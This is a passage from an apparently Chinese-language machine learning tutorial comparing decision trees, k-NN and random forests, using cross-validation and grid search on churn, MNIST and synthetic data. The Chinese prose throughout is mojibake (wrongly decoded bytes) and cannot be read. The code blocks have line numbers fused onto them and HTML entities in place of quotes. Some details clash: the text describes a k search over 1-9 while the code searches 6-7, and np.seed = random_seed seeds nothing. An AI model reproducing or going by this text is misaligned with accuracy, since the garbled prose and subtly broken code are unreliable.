·æœ¬çš„æœ€è¿‘é‚»ï¼›è‹¥è®¾ä¸º ball_tree æˆ– KD_treeï¼Œæ ·æœ¬é—´çš„è·ç¦»å‚¨å­˜åœ¨æ ‘ä¸­ï¼Œä»¥åŠ é€Ÿå¯»æ‰¾æœ€è¿‘é‚»ï¼›è‹¥è®¾ä¸º autoï¼Œå°†åŸºäºè®­ç»ƒé›†è‡ªåŠ¨é€‰æ‹©åˆé€‚çš„å¯»æ‰¾æœ€è¿‘é‚»çš„æ–¹æ³•ã€‚ leaf_sizeï¼ˆå¯é€‰ï¼‰ï¼šè‹¥å¯»æ‰¾æœ€è¿‘é‚»çš„ç®—æ³•æ˜¯ BallTree æˆ– KDTreeï¼Œåˆ™åˆ‡æ¢ä¸ºç½‘æ ¼æœç´¢æ‰€ç”¨çš„é˜ˆå€¼ã€‚ metricï¼šå¯è®¾ä¸º minkowskiã€manhattanã€euclideanã€chebyshev æˆ–å…¶ä»–ã€‚ é€‰æ‹©æ¨¡å‹å‚æ•°å’Œäº¤å‰éªŒè¯ æœºå™¨å­¦ä¹ ç®—æ³•çš„ä¸»è¦ä»»åŠ¡æ˜¯å¯ä»¥ã€Œæ³›åŒ–ã€æœªæ›¾è§è¿‡çš„æ•°æ®ã€‚ç”±äºæˆ‘ä»¬æ— æ³•ç«‹åˆ»å¾—çŸ¥æ¨¡å‹åœ¨æ–°æ•°æ®ä¸Šçš„è¡¨ç°ï¼ˆå› ä¸ºè¿˜ä¸çŸ¥é“ç›®æ ‡å˜é‡çš„çœŸå€¼ï¼‰ï¼Œå› æ­¤æœ‰å¿…è¦ç‰ºç‰²ä¸€å°éƒ¨åˆ†æ•°æ®ï¼Œæ¥éªŒè¯æ¨¡å‹çš„è´¨é‡ï¼Œå³å°†ä¸€å°éƒ¨åˆ†æ•°æ®ä½œä¸ºç•™ç½®é›†ã€‚ é€šå¸¸é‡‡ç”¨ä¸‹è¿°ä¸¤ç§æ–¹æ³•ä¹‹ä¸€æ¥éªŒè¯æ¨¡å‹çš„è´¨é‡ï¼š ç•™ç½®æ³•ã€‚ä¿ç•™ä¸€å°éƒ¨åˆ†æ•°æ®ï¼ˆä¸€èˆ¬æ˜¯ 20% åˆ° 40%ï¼‰ä½œä¸ºç•™ç½®é›†ï¼Œåœ¨å…¶ä½™æ•°æ®ä¸Šè®­ç»ƒæ¨¡å‹ï¼ˆåŸæ•°æ®é›†çš„ 60%-80%ï¼‰ï¼Œç„¶ååœ¨ç•™ç½®é›†ä¸ŠéªŒè¯æ¨¡å‹çš„è´¨é‡ã€‚ äº¤å‰éªŒè¯ã€‚æœ€å¸¸è§çš„æƒ…å½¢æ˜¯ k æŠ˜äº¤å‰éªŒè¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ åœ¨ k æŠ˜äº¤å‰éªŒè¯ä¸­ï¼Œæ¨¡å‹åœ¨åŸæ•°æ®é›†çš„ ğ¾âˆ’1Kâˆ’1 ä¸ªå­é›†ä¸Šè¿›è¡Œè®­ç»ƒï¼ˆä¸Šå›¾ç™½è‰²éƒ¨åˆ†ï¼‰ï¼Œç„¶ååœ¨å‰©ä¸‹çš„ 1 ä¸ªå­é›†ä¸ŠéªŒè¯è¡¨ç°ï¼Œé‡å¤è®­ç»ƒå’ŒéªŒè¯çš„è¿‡ç¨‹ï¼Œæ¯æ¬¡ä½¿ç”¨ä¸åŒçš„å­é›†ï¼ˆä¸Šå›¾æ©™è‰²éƒ¨åˆ†ï¼‰ï¼Œæ€»å…±è¿›è¡Œ K æ¬¡ï¼Œç”±æ­¤å¾—åˆ° K ä¸ªæ¨¡å‹è´¨é‡è¯„ä¼°æŒ‡æ•°ï¼Œé€šå¸¸ç”¨è¿™äº›è¯„ä¼°æŒ‡æ•°çš„æ±‚å’Œå¹³å‡æ•°æ¥è¡¡é‡åˆ†ç±»/å›å½’æ¨¡å‹çš„æ€»ä½“è´¨é‡ã€‚ ç›¸æ¯”ç•™ç½®æ³•ï¼Œäº¤å‰éªŒè¯èƒ½æ›´å¥½åœ°è¯„ä¼°æ¨¡å‹åœ¨æ–°æ•°æ®ä¸Šçš„è¡¨ç°ã€‚ç„¶è€Œï¼Œå½“ä½ æœ‰å¤§é‡æ•°æ®æ—¶ï¼Œäº¤å‰éªŒè¯å¯¹æœºå™¨è®¡ç®—èƒ½åŠ›çš„è¦æ±‚ä¼šå˜å¾—å¾ˆé«˜ã€‚ äº¤å‰éªŒè¯æ˜¯æœºå™¨å­¦ä¹ ä¸­éå¸¸é‡è¦çš„æŠ€æœ¯ï¼ŒåŒæ—¶ä¹Ÿåº”ç”¨äºç»Ÿè®¡å­¦å’Œç»æµå­¦é¢†åŸŸã€‚å®ƒæœ‰åŠ©äºæˆ‘ä»¬è¿›è¡Œè¶…å‚æ•°è°ƒä¼˜ã€æ¨¡å‹æ¯”è¾ƒã€ç‰¹å¾è¯„ä¼°ç­‰å…¶ä»–é‡è¦æ“ä½œã€‚ä½ å¯ä»¥ç‚¹å‡» è¿™é‡Œä»¥äº†è§£æ›´å¤šå…³äºäº¤å‰éªŒè¯çš„ä¿¡æ¯ ã€‚ åº”ç”¨æ ·ä¾‹ åœ¨å®¢æˆ·ç¦»ç½‘ç‡é¢„æµ‹ä»»åŠ¡ä¸­ä½¿ç”¨å†³ç­–æ ‘å’Œæœ€è¿‘é‚»æ–¹æ³• é¦–å…ˆè¯»å–æ•°æ®è‡³ DataFrame å¹¶è¿›è¡Œé¢„å¤„ç†ã€‚å°† State ç‰¹å¾ä» DateFrame è½¬ç§»åˆ°å•ç‹¬çš„ Series å¯¹è±¡ä¸­ã€‚æˆ‘ä»¬è®­ç»ƒçš„ç¬¬ä¸€ä¸ªæ¨¡å‹å°†ä¸åŒ…æ‹¬ State ç‰¹å¾ï¼Œä¹‹åå†è€ƒå¯Ÿ State ç‰¹å¾æ˜¯å¦æœ‰ç”¨ã€‚ 1234567891011df = pd.read_csv( &#x27;https://labfile.oss.aliyuncs.com/courses/1283/telecom_churn.csv&#x27;)df[&#x27;International plan&#x27;] = pd.factorize(df[&#x27;International plan&#x27;])[0]df[&#x27;Voice mail plan&#x27;] = pd.factorize(df[&#x27;Voice mail plan&#x27;])[0]df[&#x27;Churn&#x27;] = df[&#x27;Churn&#x27;].astype(&#x27;int&#x27;)states = df[&#x27;State&#x27;]y = df[&#x27;Churn&#x27;]df.drop([&#x27;State&#x27;, &#x27;Churn&#x27;], axis=1, inplace=True)df.head() ä¹‹åå°†æ•°æ®é›†çš„ 70% åˆ’åˆ†ä¸ºè®­ç»ƒé›†ï¼ˆX_train,y_trainï¼‰ï¼Œ30% åˆ’åˆ†ä¸ºç•™ç½®é›†ï¼ˆX_holdout,y_holdoutï¼‰ã€‚ç•™ç½®é›†çš„æ•°æ®åœ¨è°ƒä¼˜æ¨¡å‹å‚æ•°æ—¶ä¸ä¼šè¢«ç”¨åˆ°ï¼Œåœ¨è°ƒä¼˜ä¹‹åï¼Œç”¨å®ƒè¯„å®šæ‰€å¾—æ¨¡å‹çš„è´¨é‡ã€‚ æ¥ä¸‹æ¥ï¼Œè®­ç»ƒ 2 ä¸ªæ¨¡å‹ï¼šå†³ç­–æ ‘å’Œ k-NNã€‚ä¸€å¼€å§‹ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“å¦‚ä½•è®¾ç½®æ¨¡å‹å‚æ•°èƒ½ä½¿æ¨¡å‹è¡¨ç°å¥½ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨éšæœºå‚æ•°æ–¹æ³•ï¼Œå‡å®šæ ‘æ·±ï¼ˆmax_deptï¼‰ä¸º 5ï¼Œè¿‘é‚»æ•°é‡ï¼ˆn_neighborsï¼‰ä¸º 10ã€‚ 1234567891011from sklearn.model_selection import train_test_split, StratifiedKFoldfrom sklearn.neighbors import KNeighborsClassifierX_train, X_holdout, y_train, y_holdout = train_test_split(df.values, y, test_size=0.3, random_state=17)tree = DecisionTreeClassifier(max_depth=5, random_state=17)knn = KNeighborsClassifier(n_neighbors=10)tree.fit(X_train, y_train)knn.fit(X_train, y_train) ä½¿ç”¨å‡†ç¡®ç‡ï¼ˆAccuracyï¼‰åœ¨ç•™ç½®é›†ä¸Šè¯„ä»·æ¨¡å‹é¢„æµ‹çš„è´¨é‡ã€‚ 1234567from sklearn.metrics import accuracy_scoretree_pred = tree.predict(X_holdout)accuracy_score(y_holdout, tree_pred)knn_pred = knn.predict(X_holdout)accuracy_score(y_holdout, knn_pred) ä»ä¸Šå¯çŸ¥ï¼Œå†³ç­–æ ‘çš„å‡†ç¡®ç‡çº¦ä¸º 94%ï¼Œk-NN çš„å‡†ç¡®ç‡çº¦ä¸º 88%ï¼Œäºæ˜¯ä»…ä½¿ç”¨æˆ‘ä»¬å‡å®šçš„éšæœºå‚æ•°ï¼ˆå³æ²¡æœ‰è°ƒå‚ï¼‰ï¼Œå†³ç­–æ ‘çš„è¡¨ç°æ›´å¥½ã€‚ ç°åœ¨ï¼Œä½¿ç”¨äº¤å‰éªŒè¯ç¡®å®šæ ‘çš„å‚æ•°ï¼Œå¯¹æ¯æ¬¡åˆ†å‰²çš„ max_deptï¼ˆæœ€å¤§æ·±åº¦ hï¼‰å’Œ max_featuresï¼ˆæœ€å¤§ç‰¹å¾æ•°ï¼‰è¿›è¡Œè°ƒä¼˜ã€‚GridSearchCV() å‡½æ•°å¯ä»¥éå¸¸ç®€å•çš„å®ç°äº¤å‰éªŒè¯ï¼Œä¸‹é¢ç¨‹åºå¯¹æ¯ä¸€å¯¹ max_depth å’Œ max_features çš„å€¼ä½¿ç”¨ 5 æŠ˜éªŒè¯è®¡ç®—æ¨¡å‹çš„è¡¨ç°ï¼Œæ¥ç€é€‰æ‹©å‚æ•°çš„æœ€ä½³ç»„åˆã€‚ 123456789from sklearn.model_selection import GridSearchCV, cross_val_scoretree_params = &#123;&#x27;max_depth&#x27;: range(5, 7), &#x27;max_features&#x27;: range(16, 18)&#125;tree_grid = GridSearchCV(tree, tree_params, cv=5, n_jobs=-1, verbose=True)tree_grid.fit(X_train, y_train) åˆ—å‡ºäº¤å‰éªŒè¯å¾—å‡ºçš„æœ€ä½³å‚æ•°å’Œç›¸åº”çš„è®­ç»ƒé›†å‡†ç¡®ç‡å‡å€¼ã€‚ 12345tree_grid.best_params_tree_grid.best_score_accuracy_score(y_holdout, tree_grid.predict(X_holdout)) ç»˜åˆ¶æ‰€å¾—çš„å†³ç­–æ ‘ã€‚ 12345dot_data = StringIO()export_graphviz(tree_grid.best_estimator_, feature_names=df.columns, out_file=dot_data, filled=True)graph = pydotplus.graph_from_dot_data(dot_data.getvalue())Image(value=graph.create_png()) ç°åœ¨ï¼Œå†æ¬¡ä½¿ç”¨äº¤å‰éªŒè¯å¯¹ k-NN çš„ k å€¼ï¼ˆå³é‚»å±…æ•°ï¼‰è¿›è¡Œè°ƒä¼˜ã€‚ 12345678910111213141516171819from sklearn.pipeline import Pipelinefrom sklearn.preprocessing import StandardScalerknn_pipe = Pipeline([(&#x27;scaler&#x27;, StandardScaler()), (&#x27;knn&#x27;, KNeighborsClassifier(n_jobs=-1))])knn_params = &#123;&#x27;knn__n_neighbors&#x27;: range(6, 8)&#125;knn_grid = GridSearchCV(knn_pipe, knn_params, cv=5, n_jobs=-1, verbose=True)knn_grid.fit(X_train, y_train)knn_grid.best_params_, knn_grid.best_score_knn_grid.best_params_accuracy_score(y_holdout, knn_grid.predict(X_holdout)) ä»ä¸Šå¯çŸ¥ï¼Œåœ¨ 1-9 èŒƒå›´ï¼ˆrange ä¸åŒ…æ‹¬ 10ï¼‰å†…æœ€ä¼˜çš„ k å€¼ä¸º 7ï¼Œå…¶äº¤å‰éªŒè¯çš„å‡†ç¡®ç‡çº¦ä¸º 88.5%ï¼Œè°ƒä¼˜å k-NN åœ¨ç•™ç½®é›†ä¸Šçš„å‡†ç¡®ç‡çº¦ä¸º 89%ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œåœ¨è¿™ä¸ªä»»åŠ¡é‡Œï¼Œå†³ç­–æ ‘æœ‰ç€ 94%/94.6%ï¼ˆç•™ç½®æ³•/äº¤å‰éªŒè¯è°ƒä¼˜åï¼‰çš„å‡†ç¡®ç‡ï¼Œk-NN æœ‰ç€ 88%/89%ï¼ˆç•™ç½®æ³•/äº¤å‰éªŒè¯è°ƒä¼˜åï¼‰çš„å‡†ç¡®ç‡ï¼Œæ˜¾ç„¶å†³ç­–æ ‘çš„è¡¨ç°æ›´å¥½ã€‚ ä½¿ç”¨ RandomForestClassifier() æ–¹æ³•å†è®­ç»ƒä¸€ä¸ªéšæœºæ£®æ—ï¼ˆå¯ä»¥æŠŠå®ƒæƒ³è±¡æˆä¸€ç¾¤äº’ç›¸åä½œçš„å†³ç­–æ ‘ï¼‰ï¼Œçœ‹çœ‹èƒ½å¦åœ¨è¿™ä¸ªä»»åŠ¡ä¸Šæœ‰æ›´å¥½çš„è¡¨ç°ã€‚ 12345678910111213141516from sklearn.ensemble import RandomForestClassifierforest = RandomForestClassifier(n_estimators=100, n_jobs=-1, random_state=17)np.mean(cross_val_score(forest, X_train, y_train, cv=5))forest_params = &#123;&#x27;max_depth&#x27;: range(8, 10), &#x27;max_features&#x27;: range(5, 7)&#125;forest_grid = GridSearchCV(forest, forest_params, cv=5, n_jobs=-1, verbose=True)forest_grid.fit(X_train, y_train)forest_grid.best_params_, forest_grid.best_score_accuracy_score(y_holdout, forest_grid.predict(X_holdout)) ä»ä¸Šå¯çŸ¥ï¼Œéšæœºæ£®æ—æœ‰ç€ 95.3% çš„å‡†ç¡®ç‡ã€‚ä¸å¾—ä¸è¯´ï¼Œå†³ç­–æ ‘åœ¨è¿™ä¸ªä»»åŠ¡ä¸Šçš„è¡¨ç°éå¸¸å¥½ï¼Œå³ä½¿æ˜¯è®­ç»ƒæ—¶é—´é•¿å¾—å¤šçš„éšæœºæ£®æ—ä¹Ÿæ— æ³•å–å¾—æ¯”å®ƒæ›´å¥½çš„è¡¨ç°ã€‚ å†³ç­–æ ‘çš„å¤æ‚æƒ…å†µ ä¸ºäº†ç»§ç»­è®¨è®ºå†³ç­–æ ‘å’Œ k-NN çš„ä¼˜åŠ£ï¼Œè®©æˆ‘ä»¬è€ƒè™‘å¦å¤–ä¸€ä¸ªç®€å•çš„åˆ†ç±»ä»»åŠ¡ï¼Œåœ¨è¿™ä¸ªä»»åŠ¡ä¸­å†³ç­–æ ‘çš„è¡¨ç°ä¸é”™ä½†å¾—åˆ°çš„åˆ†ç±»è¾¹ç•Œè¿‡äºå¤æ‚ã€‚ é¦–å…ˆï¼Œåœ¨ä¸€ä¸ªå¹³é¢ä¸Šåˆ›å»ºä¸€ç»„å…·æœ‰ 2 ä¸ªåˆ†ç±»çš„æ•°æ®ç‚¹ï¼Œæ¯ä¸ªæ•°æ®ç‚¹æ˜¯ä¸¤ä¸ªåˆ†ç±»ä¸­çš„ä¸€ä¸ªï¼ˆçº¢è‰²è¡¨ç¤º ğ‘¥1&gt;ğ‘¥2x1&gt;x2ï¼Œé»„è‰²è¡¨ç¤º ğ‘¥1&lt;ğ‘¥2x1&lt;x2ï¼‰ï¼Œå…¶å®ç”¨ä¸€æ¡ç›´çº¿ ğ‘¥1=ğ‘¥2x1=x2 å°±å¯ä»¥å®Œæˆå®ƒä»¬çš„åˆ†ç±»ï¼Œé‚£ä¹ˆå†³ç­–æ ‘ä¼šè¿™ä¹ˆåšå—ï¼Ÿ 1234567891011121314def form_linearly_separable_data(n=500, x1_min=0, x1_max=30, x2_min=0, x2_max=30): data, target = [], [] for i in range(n): x1 = np.random.randint(x1_min, x1_max) x2 = np.random.randint(x2_min, x2_max) if np.abs(x1 - x2) &gt; 0.5: data.append([x1, x2]) target.append(np.sign(x1 - x2)) return np.array(data), np.array(target)X, y = form_linearly_separable_data()plt.scatter(X[:, 0], X[:, 1], c=y, cmap=&#x27;autumn&#x27;, edgecolors=&#x27;black&#x27;) è®­ç»ƒä¸€ä¸ªå†³ç­–æ ‘å¯¹ä¸Šé¢çš„æ•°æ®è¿›è¡Œåˆ†ç±»ï¼Œå¹¶ç»˜åˆ¶åˆ†ç±»è¾¹ç•Œã€‚ 12345678tree = DecisionTreeClassifier(random_state=17).fit(X, y)xx, yy = get_grid(X)predicted = tree.predict(np.c_[xx.ravel(), yy.ravel()]).reshape(xx.shape)plt.pcolormesh(xx, yy, predicted, cmap=&#x27;autumn&#x27;)plt.scatter(X[:, 0], X[:, 1], c=y, s=100, cmap=&#x27;autumn&#x27;, edgecolors=&#x27;black&#x27;, linewidth=1.5)plt.title(&#x27;Easy task. Decision tree compexifies everything&#x27;) å¯è§†åŒ–å†³ç­–æ ‘ã€‚ 12345dot_data = StringIO()export_graphviz(tree, feature_names=[&#x27;x1&#x27;, &#x27;x2&#x27;], out_file=dot_data, filled=True)graph = pydotplus.graph_from_dot_data(dot_data.getvalue())Image(value=graph.create_png()) ä»ä¸Šå¯çŸ¥ï¼Œå†³ç­–æ ‘æ„å»ºçš„è¾¹ç•Œè¿‡äºå¤æ‚ï¼Œè€Œä¸”æ ‘çš„æ·±åº¦è¿‡æ·±ï¼Œäº§ç”Ÿäº†è¿‡æ‹Ÿåˆç°è±¡ã€‚ å†è®­ç»ƒä¸€ä¸ª k-NN æ¨¡å‹ï¼Œçœ‹çœ‹å®ƒåœ¨è¿™ä¸ªä»»åŠ¡ä¸Šçš„è¡¨ç°æƒ…å†µã€‚è¯¥å•å…ƒæ ¼æ‰§è¡Œæ—¶é—´è¾ƒé•¿ï¼Œå»ºè®®åœ¨çº¿ä¸‹ç»ƒä¹ ï¼š 12345678knn = KNeighborsClassifier(n_neighbors=1).fit(X, y)xx, yy = get_grid(X)predicted = knn.predict(np.c_[xx.ravel(), yy.ravel()]).reshape(xx.shape)plt.pcolormesh(xx, yy, predicted, cmap=&#x27;autumn&#x27;)plt.scatter(X[:, 0], X[:, 1], c=y, s=100, cmap=&#x27;autumn&#x27;, edgecolors=&#x27;black&#x27;, linewidth=1.5)plt.title(&#x27;Easy task, kNN. Not bad&#x27;) ä»ä¸Šå¯çŸ¥ï¼Œæœ€è¿‘é‚»æ–¹æ³•çš„è¡¨ç°æ¯”å†³ç­–æ ‘å¥½ä¸€ç‚¹ï¼Œä½†ä»ç„¶æ¯”ä¸ä¸Šçº¿æ€§åˆ†ç±»å™¨ ğ‘¥1=ğ‘¥2x1=x2ï¼ˆçº¿æ€§åˆ†ç±»å™¨å°†æ˜¯ä¸‹ä¸€ä¸ªå®éªŒçš„å†…å®¹ï¼‰ã€‚ åœ¨ MNIST æ‰‹å†™æ•°å­—è¯†åˆ«ä»»åŠ¡ä¸­åº”ç”¨å†³ç­–æ ‘å’Œ k-NN ç°åœ¨å¯ä»¥çœ‹çœ‹è¿™ä¸¤ä¸ªç®—æ³•åº”ç”¨åˆ°å®é™…ä»»åŠ¡ä¸Šçš„è¡¨ç°å¦‚ä½•ï¼Œé¦–å…ˆè½½å…¥ sklearn å†…ç½®çš„ MNIST æ‰‹å†™æ•°å­—æ•°æ®é›†ï¼Œè¯¥æ•°æ®åº“ä¸­æ‰‹å†™æ•°å­—çš„å›¾ç‰‡ä¸º 8x8 çš„çŸ©é˜µï¼ŒçŸ©é˜µä¸­çš„å€¼è¡¨ç¤ºæ¯ä¸ªåƒç´ çš„ç™½è‰²äº®åº¦ã€‚ 123456from sklearn.datasets import load_digitsdata = load_digits()X, y = data.data, data.targetX[0, :].reshape([8, 8]) ç»˜åˆ¶ä¸€äº› MNIST æ‰‹å†™æ•°å­—ã€‚ 123f, axes = plt.subplots(1, 4, sharey=True, figsize=(16, 6))for i in range(4): axes[i].imshow(X[i, :].reshape([8, 8]), cmap=&#x27;Greys&#x27;) ä½¿ç”¨ train_test_split() æ–¹æ³•åˆ†å‰²æ•°æ®é›†ï¼Œå…¶ä¸­çš„ 70% ä½œä¸ºè®­ç»ƒé›†ï¼ˆX_trainï¼Œy_trainï¼‰ï¼Œ30% ä½œä¸ºç•™ç½®é›†ï¼ˆX_holdoutï¼Œy_holdoutï¼‰ã€‚ 12X_train, X_holdout, y_train, y_holdout = train_test_split( X, y, test_size=0.3, random_state=17) ä½¿ç”¨éšæœºå‚æ•°è®­ç»ƒå†³ç­–æ ‘å’Œ k-NNã€‚ 123456tree = DecisionTreeClassifier(max_depth=5, random_state=17)knn_pipe = Pipeline([(&#x27;scaler&#x27;, StandardScaler()), (&#x27;knn&#x27;, KNeighborsClassifier(n_neighbors=10))])tree.fit(X_train, y_train)knn_pipe.fit(X_train, y_train) è®­ç»ƒå¥½ä¹‹åï¼Œåˆ†åˆ«åœ¨ç•™ç½®é›†ä¸Šåšå‡ºé¢„æµ‹ã€‚ 1234tree_pred = tree.predict(X_holdout)knn_pred = knn_pipe.predict(X_holdout)accuracy_score(y_holdout, knn_pred), accuracy_score( y_holdout, tree_pred) # (0.976, 0.666) ä»ä¸Šå¯çŸ¥ï¼Œk-NN åšå¾—æ›´å¥½ï¼Œä¸è¿‡åˆ«å¿˜äº†æˆ‘ä»¬ç”¨çš„æ˜¯éšæœºå‚æ•°ã€‚ç°åœ¨ï¼Œä½¿ç”¨äº¤å‰éªŒè¯è°ƒä¼˜å†³ç­–æ ‘æ¨¡å‹ï¼Œå› ä¸ºè¿™æ¬¡ä»»åŠ¡æ‰€éœ€è€ƒè™‘çš„ç‰¹å¾æ¯”ä¹‹å‰ä»»åŠ¡ä¸­çš„æ›´å¤šï¼Œæ‰€ä»¥å¯ä»¥å¢åŠ å‚æ•°çš„å¤§å°ã€‚ 1234567tree_params = &#123;&#x27;max_depth&#x27;: [10, 20, 30], &#x27;max_features&#x27;: [30, 50, 64]&#125;tree_grid = GridSearchCV(tree, tree_params, cv=5, n_jobs=-1, verbose=True)tree_grid.fit(X_train, y_train) æŸ¥çœ‹äº¤å‰éªŒè¯å¾—åˆ°çš„æœ€ä½³å‚æ•°ç»„åˆå’Œç›¸åº”çš„å‡†ç¡®ç‡ã€‚ 1tree_grid.best_params_, tree_grid.best_score_ è°ƒä¼˜åå†³ç­–æ ‘æ¨¡å‹çš„å‡†ç¡®ç‡è¾¾åˆ°äº† 84.4%ï¼Œä½†è¿˜ä¸åˆ°ä½¿ç”¨éšæœºå‚æ•°çš„ k-NN çš„å‡†ç¡®ç‡ï¼ˆ97%ï¼‰ã€‚ç°åœ¨ï¼Œä½¿ç”¨äº¤å‰éªŒè¯è°ƒä¼˜ k-NN æ¨¡å‹ã€‚ 12np.mean(cross_val_score(KNeighborsClassifier( n_neighbors=1), X_train, y_train, cv=5)) ä»ä¸Šå¯çŸ¥ï¼Œè°ƒä¼˜åçš„ k-NN åœ¨è¿™ä¸€æ•°æ®é›†ä¸Šå¯ä»¥è¾¾åˆ° 98.7% çš„å‡†ç¡®ç‡ã€‚ ä¸‹é¢åœ¨è¿™ä¸€æ•°æ®é›†ä¸Šè®­ç»ƒéšæœºæ£®æ—æ¨¡å‹ï¼Œåœ¨å¤§å¤šæ•°æ•°æ®é›†ä¸Šï¼Œå®ƒçš„æ•ˆæœæ¯” k-NN è¦å¥½ã€‚ 12np.mean(cross_val_score(RandomForestClassifier( random_state=17), X_train, y_train, cv=5)) ä»ä¸Šå¯çŸ¥ï¼Œåœ¨è¿™ä¸ªæ•°æ®é›†ä¸­éšæœºæ£®æ—çš„å‡†ç¡®ç‡ï¼ˆ93.5%ï¼‰ä¸å¦‚ k-NNï¼ˆ98.7%ï¼‰ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬æ²¡æœ‰å¯¹éšæœºæ£®æ—çš„å‚æ•°è¿›è¡Œä»»ä½•è°ƒä¼˜ï¼Œä½†å³ä½¿ç»è¿‡è°ƒä¼˜ï¼Œè®­ç»ƒç²¾ç¡®åº¦ä¹Ÿæ— æ³•è¶…è¿‡ k-NNã€‚ å†³ç­–æ ‘ã€k-NNã€éšæœºæ£®æ—åœ¨è¿™ä¸ªæ•°æ®é›†ä¸Šçš„å‡†ç¡®ç‡å¦‚ä¸‹æ‰€ç¤ºï¼š ç®—æ³•\\æ–¹å¼ ç•™ç½®æ³• äº¤å‰éªŒè¯ å†³ç­–æ ‘ 0.667 0.844 k-NN 0.976 0.987 éšæœºæ£®æ— / 0.934 ä»è¿™ä¸ªä»»åŠ¡ä¸­å¾—åˆ°çš„ç»“è®ºï¼ˆåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªé€šç”¨çš„å»ºè®®ï¼‰ï¼šé¦–å…ˆæŸ¥çœ‹ç®€å•æ¨¡å‹ï¼ˆå†³ç­–æ ‘ã€æœ€è¿‘é‚»ï¼‰åœ¨ä½ çš„æ•°æ®ä¸Šçš„è¡¨ç°ï¼Œå› ä¸ºå¯èƒ½ä»…ä½¿ç”¨ç®€å•æ¨¡å‹å°±å·²ç»è¡¨ç°å¾—è¶³å¤Ÿå¥½äº†ã€‚ æœ€è¿‘é‚»æ–¹æ³•çš„å¤æ‚æƒ…å½¢ ä¸‹é¢è€ƒè™‘å¦ä¸€ç§æƒ…å†µï¼Œå³åœ¨ä¸€ä¸ªåˆ†ç±»é—®é¢˜ä¸­ï¼ŒæŸä¸ªç‰¹å¾ç›´æ¥å’Œç›®æ ‡å˜é‡æˆæ¯”ä¾‹çš„æƒ…å†µã€‚ 1234567891011def form_noisy_data(n_obj=1000, n_feat=100, random_seed=17): np.seed = random_seed y = np.random.choice([-1, 1], size=n_obj) # ç¬¬ä¸€ä¸ªç‰¹å¾ä¸ç›®æ ‡æˆæ¯”ä¾‹ x1 = 0.3 * y # å…¶ä»–ç‰¹å¾ä¸ºå™ªå£° x_other = np.random.random(size=[n_obj, n_feat - 1]) return np.hstack([x1.reshape([n_obj, 1]), x_other]), yX, y = form_noisy_data() ä½¿ç”¨æœ€è¿‘é‚»æ–¹æ³•è®­ç»ƒæ¨¡å‹åï¼ŒæŸ¥çœ‹äº¤å‰éªŒè¯å’Œç•™ç½®é›†çš„å‡†ç¡®ç‡ï¼Œå¹¶ç»˜åˆ¶è¿™ä¸¤ä¸ªå‡†ç¡®ç‡éš n_neighbors æœ€è¿‘é‚»æ•°ç›® å‚æ•°å˜åŒ–çš„æ›²çº¿ï¼Œè¿™æ ·çš„æ›²çº¿è¢«ç§°ä¸ºéªŒè¯æ›²çº¿ã€‚ 12345678910111213141516171819202122from sklearn.model_selection import cross_val_scoreX_train, X_holdout, y_train, y_holdout = train_test_split( X, y, test_size=0.3, random_state=17)cv_scores, holdout_scores = [], []n_neighb = [1, 2, 3, 5] + list(range(50, 550, 50))for k in n_neighb: knn_pipe = Pipeline([(&#x27;scaler&#x27;, StandardScaler()), (&#x27;knn&#x27;, KNeighborsClassifier(n_neighbors=k))]) cv_scores.append(np.mean(cross_val_score( knn_pipe, X_train, y_train, cv=5))) knn_pipe.fit(X_train, y_train) holdout_scores.append(accuracy_score( y_holdout, knn_pipe.predict(X_holdout)))plt.plot(n_neighb, cv_scores, label=&#x27;CV&#x27;)plt.plot(n_neighb, holdout_scores, label=&#x27;holdout&#x27;)plt.title(&#x27;Easy task. kNN fails&#x27;)plt.legend() ä¸Šå›¾è¡¨æ˜ï¼Œå³ä½¿æˆ‘ä»¬å°è¯•åœ¨è¾ƒå¹¿èŒƒå›´å†…æ”¹å˜ n_neighbors å‚æ•°ï¼ŒåŸºäºæ¬§å‡ é‡Œå¾—è·ç¦»çš„ k-NN åœ¨è¿™ä¸ªé—®é¢˜ä¸Šä¾æ—§è¡¨ç°ä¸ä½³ã€‚ ä¸‹é¢ç”¨å†³ç­–æ ‘è®­ç»ƒä¸€ä¸ªæ¨¡å‹ï¼Œçœ‹çœ‹å®ƒåœ¨è¿™ä¸ªä»»åŠ¡ä¸Šçš„è¡¨ç°å¦‚ä½•ã€‚ 123456tree = DecisionTreeClassifier(random_state=17, max_depth=1)tree_cv_score = np.mean(cross_val_score(tree, X_train, y_train, cv=5))tree.fit(X_train, y_train)tree_holdout_score = accuracy_score(y_holdout, tree.predict(X_holdout))print(&#x27;Decision tree. CV: &#123;&#125;, holdout: &#123;&#125;&#x27;.format( tree_cv_score, tree_holdout_score)) åœ¨è¿™ä¸€ä»»åŠ¡ä¸­ï¼Œå†³ç­–æ ‘å®Œç¾åœ°è§£å†³äº†é—®é¢˜ï¼Œåœ¨äº¤å‰éªŒè¯å’Œç•™ç½®é›†ä¸Šéƒ½å¾—åˆ°äº† 100% çš„å‡†ç¡®ç‡ã€‚å…¶å®ï¼Œk-NN ä¹‹æ‰€ä»¥åœ¨è¿™ä¸ªä»»åŠ¡ä¸Šè¡¨ç°ä¸ä½³å¹¶éè¯¥æ–¹æ³•æœ¬èº«çš„é—®é¢˜ï¼Œè€Œæ˜¯å› ä¸ºä½¿ç”¨äº†æ¬§å‡ é‡Œå¾—è·ç¦»ï¼Œå› ä¸ºæ¬§å‡ é‡Œå¾—è·ç¦»æ²¡èƒ½å¯Ÿè§‰å‡ºæœ‰ä¸€ä¸ªç‰¹å¾ï¼ˆæˆæ¯”ä¾‹ï¼‰æ¯”å…¶ä»–æ‰€æœ‰ç‰¹å¾ï¼ˆå™ªå£°ï¼‰æ›´é‡è¦ã€‚ å†³ç­–æ ‘å’Œæœ€è¿‘é‚»æ–¹æ³•çš„ä¼˜åŠ¿å’ŒåŠ£åŠ¿ å†³ç­–æ ‘ ä¼˜åŠ¿ï¼š ç”Ÿæˆå®¹æ˜“ç†è§£çš„åˆ†ç±»è§„åˆ™ï¼Œè¿™ä¸€å±æ€§ç§°ä¸ºæ¨¡å‹çš„å¯è§£é‡Šæ€§ã€‚ä¾‹å¦‚å®ƒç”Ÿæˆçš„è§„åˆ™å¯èƒ½æ˜¯ã€Œå¦‚æœå¹´é¾„ä¸æ»¡ 25 